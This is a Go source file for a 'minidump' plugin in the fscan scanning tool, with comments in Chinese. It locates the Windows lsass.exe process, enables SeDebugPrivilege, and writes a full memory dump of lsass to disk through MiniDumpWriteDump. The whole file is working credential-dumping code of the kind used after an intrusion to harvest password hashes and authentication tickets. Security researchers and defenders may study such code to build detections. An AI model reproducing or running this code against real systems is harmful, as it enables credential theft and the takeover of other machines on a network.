//go:build (plugin_minidump || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
	"golang.org/x/sys/windows"
)

const (
	TH32CS_SNAPPROCESS   = 0x00000002
	INVALID_HANDLE_VALUE = ^uintptr(0)
	MAX_PATH             = 260
	PROCESS_ALL_ACCESS   = 0x1F0FFF
	SE_PRIVILEGE_ENABLED = 0x00000002
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// MiniDumpPlugin 内存转储插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现内存转储功能
// - 保持原有功能逻辑
type MiniDumpPlugin struct {
	plugins.BasePlugin
	kernel32 *syscall.DLL
	dbghelp  *syscall.DLL
	advapi32 *syscall.DLL
}

// ProcessManager Windows进程管理器
type ProcessManager struct {
	kernel32 *syscall.DLL
	dbghelp  *syscall.DLL
	advapi32 *syscall.DLL
}

// NewMiniDumpPlugin 创建内存转储插件
func NewMiniDumpPlugin() *MiniDumpPlugin {
	return &MiniDumpPlugin{
		BasePlugin: plugins.NewBasePlugin("minidump"),
	}
}

// Scan 执行内存转储 - 直接实现
func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	defer func() {
		if r := recover(); r != nil {
			common.LogError(i18n.Tr("minidump_panic", r))
		}
	}()

	var output strings.Builder

	output.WriteString("=== 进程内存转储 ===\n")
	output.WriteString(fmt.Sprintf("平台: %s\n", runtime.GOOS))

	// 加载系统DLL
	if err := p.loadSystemDLLs(); err != nil {
		output.WriteString(fmt.Sprintf("加载系统DLL失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查管理员权限
	if !p.isAdmin() {
		output.WriteString("需要管理员权限才能执行内存转储\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   errors.New("需要管理员权限"),
		}
	}

	output.WriteString("✓ 已确认具有管理员权限\n")

	// 创建进程管理器
	pm := &ProcessManager{
		kernel32: p.kernel32,
		dbghelp:  p.dbghelp,
		advapi32: p.advapi32,
	}

	// 查找lsass.exe进程
	output.WriteString("正在查找lsass.exe进程...\n")
	pid, err := pm.findProcess("lsass.exe")
	if err != nil {
		output.WriteString(fmt.Sprintf("查找lsass.exe失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(fmt.Sprintf("✓ 找到lsass.exe进程, PID: %d\n", pid))

	// 提升权限
	output.WriteString("正在提升SeDebugPrivilege权限...\n")
	if privErr := pm.elevatePrivileges(); privErr != nil {
		output.WriteString(fmt.Sprintf("权限提升失败: %v (尝试继续执行)\n", privErr))
	} else {
		output.WriteString("✓ 权限提升成功\n")
	}

	// 创建转储文件
	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
	output.WriteString(fmt.Sprintf("准备创建转储文件: %s\n", outputPath))

	// 执行转储
	output.WriteString("开始执行内存转储...\n")

	// 创建带超时的context
	dumpCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
	defer cancel()

	err = pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("内存转储失败: %v\n", err))
		// 创建错误信息文件
		errorData := []byte(fmt.Sprintf("Memory dump failed for PID %d\nError: %v\nTimestamp: %s\n",
			pid, err, time.Now().Format("2006-01-02 15:04:05")))
		_ = os.WriteFile(outputPath, errorData, 0644)

		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 获取文件信息
	fileInfo, err := os.Stat(outputPath)
	var fileSize int64
	if err == nil {
		fileSize = fileInfo.Size()
	}

	output.WriteString("✓ 内存转储完成\n")
	output.WriteString(fmt.Sprintf("转储文件: %s\n", outputPath))
	output.WriteString(fmt.Sprintf("文件大小: %d bytes\n", fileSize))

	common.LogSuccess(i18n.Tr("minidump_success", outputPath, fileSize))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// loadSystemDLLs 加载系统DLL
func (p *MiniDumpPlugin) loadSystemDLLs() error {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("加载 kernel32.dll 失败: %w", err)
	}

	dbghelp, err := syscall.LoadDLL("Dbghelp.dll")
	if err != nil {
		return fmt.Errorf("加载 Dbghelp.dll 失败: %w", err)
	}

	advapi32, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return fmt.Errorf("加载 advapi32.dll 失败: %w", err)
	}

	p.kernel32 = kernel32
	p.dbghelp = dbghelp
	p.advapi32 = advapi32

	return nil
}

// isAdmin 检查是否具有管理员权限
func (p *MiniDumpPlugin) isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer func() { _ = windows.FreeSid(sid) }()

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return err == nil && member
}

// ProcessManager 方法实现

// findProcess 查找进程
func (pm *ProcessManager) findProcess(name string) (uint32, error) {
	snapshot, err := pm.createProcessSnapshot()
	if err != nil {
		return 0, err
	}
	defer pm.closeHandle(snapshot)

	return pm.findProcessInSnapshot(snapshot, name)
}

// createProcessSnapshot 创建进程快照
func (pm *ProcessManager) createProcessSnapshot() (uintptr, error) {
	proc, err := pm.kernel32.FindProc("CreateToolhelp32Snapshot")
	if err != nil {
		return 0, fmt.Errorf("查找CreateToolhelp32Snapshot函数失败: %w", err)
	}

	handle, _, err := proc.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if handle == uintptr(INVALID_HANDLE_VALUE) {
		lastError := windows.GetLastError()
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("创建进程快照失败: %v (LastError: %d)", err, lastError)
	}
	return handle, nil
}

// findProcessInSnapshot 在快照中查找进程
func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (uint32, error) {
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	proc32First, err := pm.kernel32.FindProc("Process32FirstW")
	if err != nil {
		return 0, fmt.Errorf("查找Process32FirstW函数失败: %w", err)
	}

	proc32Next, err := pm.kernel32.FindProc("Process32NextW")
	if err != nil {
		return 0, fmt.Errorf("查找Process32NextW函数失败: %w", err)
	}

	lstrcmpi, err := pm.kernel32.FindProc("lstrcmpiW")
	if err != nil {
		return 0, fmt.Errorf("查找lstrcmpiW函数失败: %w", err)
	}

	ret, _, _ := proc32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("获取第一个进程失败 (LastError: %d)", windows.GetLastError())
	}

	for {
		namePtr, err := syscall.UTF16PtrFromString(name)
		if err != nil {
			return 0, fmt.Errorf("转换进程名失败: %w", err)
		}

		ret, _, _ = lstrcmpi.Call(
			uintptr(unsafe.Pointer(namePtr)),
			uintptr(unsafe.Pointer(&pe32.szExeFile[0])),
		)

		if ret == 0 {
			return pe32.th32ProcessID, nil
		}

		ret, _, _ = proc32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("未找到进程: %s", name)
}

// elevatePrivileges 提升权限
func (pm *ProcessManager) elevatePrivileges() error {
	handle, err := pm.getCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(handle, syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("打开进程令牌失败: %w", err)
	}
	defer func() { _ = token.Close() }()

	var tokenPrivileges TOKEN_PRIVILEGES

	privilegeName, err := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if err != nil {
		return fmt.Errorf("转换权限名称失败: %w", err)
	}

	lookupPrivilegeValue := pm.advapi32.MustFindProc("LookupPrivilegeValueW")
	ret, _, err := lookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privilegeName)),
		uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)),
	)
	if ret == 0 {
		return fmt.Errorf("查找特权值失败: %w", err)
	}

	tokenPrivileges.PrivilegeCount = 1
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	adjustTokenPrivileges := pm.advapi32.MustFindProc("AdjustTokenPrivileges")
	ret, _, err = adjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tokenPrivileges)),
		0, 0, 0,
	)
	if ret == 0 {
		return fmt.Errorf("调整令牌特权失败: %w", err)
	}

	return nil
}

// getCurrentProcess 获取当前进程句柄
func (pm *ProcessManager) getCurrentProcess() (syscall.Handle, error) {
	proc := pm.kernel32.MustFindProc("GetCurrentProcess")
	handle, _, _ := proc.Call()
	if handle == 0 {
		return 0, fmt.Errorf("获取当前进程句柄失败")
	}
	return syscall.Handle(handle), nil
}

// dumpProcessWithTimeout 带超时的转储进程内存
func (pm *ProcessManager) dumpProcessWithTimeout(ctx context.Context, pid uint32, outputPath string) error {
	resultChan := make(chan error, 1)

	go func() {
		resultChan <- pm.dumpProcess(pid, outputPath)
	}()

	select {
	case err := <-resultChan:
		return err
	case <-ctx.Done():
		return fmt.Errorf("内存转储超时 (120秒)")
	}
}

// dumpProcess 转储进程内存
func (pm *ProcessManager) dumpProcess(pid uint32, outputPath string) error {
	processHandle, err := pm.openProcess(pid)
	if err != nil {
		return err
	}
	defer pm.closeHandle(processHandle)

	fileHandle, err := pm.createDumpFile(outputPath)
	if err != nil {
		return err
	}
	defer pm.closeHandle(fileHandle)

	miniDumpWriteDump, err := pm.dbghelp.FindProc("MiniDumpWriteDump")
	if err != nil {
		return fmt.Errorf("查找MiniDumpWriteDump函数失败: %w", err)
	}

	// 转储类型标志
	const MiniDumpWithDataSegs = 0x00000001
	const MiniDumpWithFullMemory = 0x00000002
	const MiniDumpWithHandleData = 0x00000004
	const MiniDumpWithUnloadedModules = 0x00000020
	const MiniDumpWithIndirectlyReferencedMemory = 0x00000040
	const MiniDumpWithProcessThreadData = 0x00000100
	const MiniDumpWithPrivateReadWriteMemory = 0x00000200
	const MiniDumpWithFullMemoryInfo = 0x00000800
	const MiniDumpWithThreadInfo = 0x00001000
	const MiniDumpWithCodeSegs = 0x00002000

	// 组合转储类型标志
	dumpType := MiniDumpWithDataSegs | MiniDumpWithFullMemory | MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules | MiniDumpWithIndirectlyReferencedMemory |
		MiniDumpWithProcessThreadData | MiniDumpWithPrivateReadWriteMemory |
		MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo | MiniDumpWithCodeSegs

	ret, _, _ := miniDumpWriteDump.Call(
		processHandle,
		uintptr(pid),
		fileHandle,
		uintptr(dumpType),
		0, 0, 0,
	)

	if ret == 0 {
		// 尝试使用较小的转储类型作为后备
		fallbackDumpType := MiniDumpWithDataSegs | MiniDumpWithPrivateReadWriteMemory | MiniDumpWithHandleData

		ret, _, _ = miniDumpWriteDump.Call(
			processHandle,
			uintptr(pid),
			fileHandle,
			uintptr(fallbackDumpType),
			0, 0, 0,
		)

		if ret == 0 {
			//nolint:errorlint // Windows LastError不应该wrapped
			return fmt.Errorf("写入转储文件失败 (LastError: %d)", windows.GetLastError())
		}
	}

	return nil
}

// openProcess 打开进程
func (pm *ProcessManager) openProcess(pid uint32) (uintptr, error) {
	proc, err := pm.kernel32.FindProc("OpenProcess")
	if err != nil {
		return 0, fmt.Errorf("查找OpenProcess函数失败: %w", err)
	}

	handle, _, callErr := proc.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	if handle == 0 {
		lastError := windows.GetLastError()
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("打开进程失败: %v (LastError: %d)", callErr, lastError)
	}
	return handle, nil
}

// createDumpFile 创建转储文件
func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}

	createFile, err := pm.kernel32.FindProc("CreateFileW")
	if err != nil {
		return 0, fmt.Errorf("查找CreateFileW函数失败: %w", err)
	}

	handle, _, callErr := createFile.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		syscall.GENERIC_WRITE,
		0, 0,
		syscall.CREATE_ALWAYS,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == INVALID_HANDLE_VALUE {
		lastError := windows.GetLastError()
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("创建文件失败: %v (LastError: %d)", callErr, lastError)
	}

	return handle, nil
}

// closeHandle 关闭句柄
func (pm *ProcessManager) closeHandle(handle uintptr) {
	if proc, err := pm.kernel32.FindProc("CloseHandle"); err == nil {
		_, _, _ = proc.Call(handle)
	}
}

// 注册插件
func init() {
	RegisterLocalPlugin("minidump", func() Plugin {
		return NewMiniDumpPlugin()
	})
}
